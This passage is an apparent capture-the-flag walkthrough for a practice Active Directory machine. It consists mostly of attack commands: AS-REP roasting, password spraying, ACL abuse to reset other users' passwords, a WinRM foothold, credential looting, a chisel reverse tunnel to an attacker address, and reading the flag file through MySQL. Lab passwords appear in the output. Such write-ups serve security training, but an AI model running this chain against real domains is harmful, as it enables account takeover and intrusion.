Martinez --\u0026gt; o.martinez\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Kevin Turner --\u0026gt;k.turner\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Amanda Walker --\u0026gt;a.walker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Marcus Harris --\u0026gt;m.harris\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Lauren Clark --\u0026gt;l.clark\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Ethan Rodriguez e.rodriguez\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eAesproasting :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eusername-anarchy -i users.txt \u0026gt; out.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb users\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetNPUsers.py infiltrator/ -usersfile users -format hashcat -dc-ip dc01.infiltrator.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehashcat -m \u003cspan class=\"m\"\u003e18200\u003c/span\u003e -a \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e /usr/share/wordlists/rockyou.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003el.clark : WAT?watismypass!\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.129.162.64 -u l.clark -p \u003cspan class=\"s1\"\u003e\u0026#39;WAT?watismypass!\u0026#39;\u003c/span\u003e --rid-brute \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s1\"\u003e\u0026#39;\\\\\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s1\"\u003e$\u0026#39;\\\\\u0026#39;\u003c/span\u003e -f2 \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e -f1 \u003cspan class=\"p\"\u003e|\u003c/span\u003e tee -a users_rid.txt\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnum :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodhound-python -d \u003cspan class=\"s1\"\u003e\u0026#39;infiltrator.htb\u0026#39;\u003c/span\u003e -u \u003cspan class=\"s1\"\u003e\u0026#39;l.clark\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;WAT?watismypass!\u0026#39;\u003c/span\u003e -ns 127.0.0.1 -dc dc01.infiltrator.htb -c all\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eUser  Description :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec ldap 10.129.96.85 -u l.clark -p \u003cspan class=\"s1\"\u003e\u0026#39;WAT?watismypass!\u0026#39;\u003c/span\u003e --user\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eK.turner \u003cspan class=\"p\"\u003e|\u003c/span\u003e MessengerApp@Pass!\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eSpraying :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.129.62.59 -u users_rid.txt -p \u003cspan class=\"s1\"\u003e\u0026#39;WAT?watismypass!\u0026#39;\u003c/span\u003e --continue-on-success\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einfiltrator.htb\u003cspan class=\"se\"\u003e\\D\u003c/span\u003e.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einfiltrator.htb\u003cspan class=\"se\"\u003e\\L\u003c/span\u003e.clark:WAT?watismypass!\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einfiltrator.htb\u003cspan class=\"se\"\u003e\\M\u003c/span\u003e.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.129.62.59 -u users_rid.txt -p \u003cspan class=\"s1\"\u003e\u0026#39;WAT?watismypass!\u0026#39;\u003c/span\u003e --continue-on-success -k\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einfiltrator.htb\u003cspan class=\"se\"\u003e\\D\u003c/span\u003e.anderson:WAT?watismypass!\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einfiltrator.htb\u003cspan class=\"se\"\u003e\\L\u003c/span\u003e.clark:WAT?watismypass!\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eModifying krb5.conf :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003elibdefaults\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003edefault_realm\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e INFILTRATOR.HTB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003erealms\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    INFILTRATOR.HTB \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ekdc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.10.11.31\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eadmin_server\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.10.11.31\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003edomain_realm\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    .infiltrator.htb \u003cspan class=\"o\"\u003e=\u003c/span\u003e INFILTRATOR.HTB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    infiltrator.htb \u003cspan class=\"o\"\u003e=\u003c/span\u003e INFILTRATOR.HTB\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eReset  password :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egetTGT.py \u003cspan class=\"s1\"\u003e\u0026#39;infiltrator.htb\u0026#39;\u003c/span\u003e/\u003cspan class=\"s1\"\u003e\u0026#39;d.anderson\u0026#39;\u003c/span\u003e@\u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edacledit.py -action write -rights FullControl -principal d.anderson -target-dn \u003cspan class=\"s2\"\u003e\u0026#34;OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB\u0026#34;\u003c/span\u003e -inheritance -k -dc-ip \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e infiltrator.htb/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodyAD --host \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -d \u003cspan class=\"s2\"\u003e\u0026#34;infiltrator.htb\u0026#34;\u003c/span\u003e -k \u003cspan class=\"nb\"\u003eset\u003c/span\u003e password e.rodriguez \u003cspan class=\"s2\"\u003e\u0026#34;Password1234\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodyAD --host \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -d \u003cspan class=\"s2\"\u003e\u0026#34;infiltrator.htb\u0026#34;\u003c/span\u003e -u \u003cspan class=\"s2\"\u003e\u0026#34;e.rodriguez\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;Password1234\u0026#34;\u003c/span\u003e add groupMember \u003cspan class=\"s2\"\u003e\u0026#34;CHIEFS MARKETING\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;e.rodriguez\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodyAD --host \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -d \u003cspan class=\"s2\"\u003e\u0026#34;infiltrator.htb\u0026#34;\u003c/span\u003e -u \u003cspan class=\"s2\"\u003e\u0026#34;e.rodriguez\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;Password1234\u0026#34;\u003c/span\u003e \u003cspan class=\"nb\"\u003eset\u003c/span\u003e password m.harris \u003cspan class=\"s2\"\u003e\u0026#34;Password12345\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eFoothold :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egetTGT.py \u003cspan class=\"s1\"\u003e\u0026#39;infiltrator.htb\u0026#39;\u003c/span\u003e/\u003cspan class=\"s1\"\u003e\u0026#39;m.harris\u0026#39;\u003c/span\u003e@10.129.62.59\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevil-winrm -i dc01.infiltrator.htb -r INFILTRATOR.HTB\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCreds looting :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*Evil-WinRM* PS C:\u003cspan class=\"se\"\u003e\\\u0026gt;\u003c/span\u003e cmd /c dir /A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Volume in drive C has no label.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Volume Serial Number is 96C7-B603\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Directory of C:\u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02/19/2024  06:45 PM    \u0026lt;DIR\u0026gt;          \u003cspan class=\"nv\"\u003e$Recycle\u003c/span\u003e.Bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02/19/2024  08:32 AM    \u0026lt;DIR\u0026gt;          .NET Framework 4.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e12/04/2023  07:21 PM    \u0026lt;JUNCTION\u0026gt;     Documents and Settings \u003cspan class=\"o\"\u003e[\u003c/span\u003eC:\u003cspan class=\"se\"\u003e\\U\u003c/span\u003esers\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e12/04/2023  11:14 AM    \u0026lt;DIR\u0026gt;          inetpub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e09/04/2024  09:02 PM       738,197,504 pagefile.sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e11/05/2022  12:03 PM    \u0026lt;DIR\u0026gt;          PerfLogs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02/23/2024  06:06 AM    \u0026lt;DIR\u0026gt;          Program Files\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02/20/2024  04:18 AM    \u0026lt;DIR\u0026gt;          Program Files \u003cspan class=\"o\"\u003e(\u003c/span\u003ex86\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02/22/2024  01:27 PM                 \u003cspan class=\"m\"\u003e0\u003c/span\u003e Program1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02/25/2024  08:34 AM                 \u003cspan class=\"m\"\u003e0\u003c/span\u003e Program2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e09/04/2024  09:05 PM    \u0026lt;DIR\u0026gt;          ProgramData\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e12/04/2023  07:21 PM    \u0026lt;DIR\u0026gt;          Recovery\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e02/20/2024  04:22 AM    \u0026lt;DIR\u0026gt;          System Volume Information\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e09/05/2024  12:37 AM    \u0026lt;DIR\u0026gt;          temp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e08/02/2024  04:51 PM    \u0026lt;DIR\u0026gt;          Users\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e08/21/2024  01:53 PM    \u0026lt;DIR\u0026gt;          Windows\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eSep 05, \u003cspan class=\"m\"\u003e2024\u003c/span\u003e - 10:19:49 \u003cspan class=\"o\"\u003e(\u003c/span\u003eCEST\u003cspan class=\"o\"\u003e)]\u003c/span\u003e exegol-Algo out \u003cspan class=\"c1\"\u003e# cat OutputMysql.ini\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eSETTINGS\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSQLPort\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e14406\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eVersion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eDBCONFIG\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDBUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDBPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eibWijteig5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDBName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eoutputwall\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003ePATHCONFIG\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003emysql5.6.17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eMySQL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elog\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edef_conf\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esettings\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eMySQL_data\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBackup\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebackup\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePrivesc :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./chisel.exe client 10.10.14.190:8888 R:1080:socks\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./chisel server -p \u003cspan class=\"m\"\u003e8888\u003c/span\u003e -reverse \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#proxychain to burp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eunattended :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSELECT LOAD_FILE\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efce216c915adb6d843abe6b1defc7dce\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eAttended :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePS C:\u003cspan class=\"se\"\u003e\\U\u003c/span\u003eserExplorer\u0026gt; .\u003cspan class=\"se\"\u003e\\U\u003c/span\u003eserExplorer.exe -u m.harris -p D3v310p3r_Pass@1337! -s m.harris Attempting Service 